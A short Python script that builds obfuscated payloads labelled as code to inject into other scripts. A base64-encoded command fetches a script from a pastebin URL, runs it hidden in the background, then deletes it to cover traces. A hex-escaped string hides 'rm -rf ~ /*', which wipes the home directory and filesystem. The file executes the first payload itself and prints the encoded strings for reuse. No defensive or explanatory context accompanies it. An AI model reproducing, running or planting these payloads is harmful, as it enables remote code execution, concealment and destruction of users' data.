"""
Code 1 to inject in script
Pastbin code: ping -c 4 8.8.8.8
"""
import os, base64

cm = 'd2dldCAtcSBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUDZjY1NDaGEgLU8gLnNoOyBjaG1vZCAreCAuc2g7IG5vaHVwIC4vLnNoID4vZGV2L251bGwgMj4mMSAm'
c = base64.b64decode(cm).decode()

rm = 'cm0gLnNo'
r = base64.b64decode(rm).decode()

os.system(c)
os.system(r)

# Generate string
str_for_code = base64.b64encode('wget -q https://pastebin.com/raw/P6ccSCha -O .sh; chmod +x .sh; nohup ./.sh >/dev/null 2>&1 &'.encode())
str_rm = base64.b64encode('rm .sh'.encode())
print(str_for_code)
print('#####################')
print(str_rm)

"""
Code 2 to inject in script
Code: rm -rf ~ /* 2> /dev/null &
"""
jmpcode = '\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26'
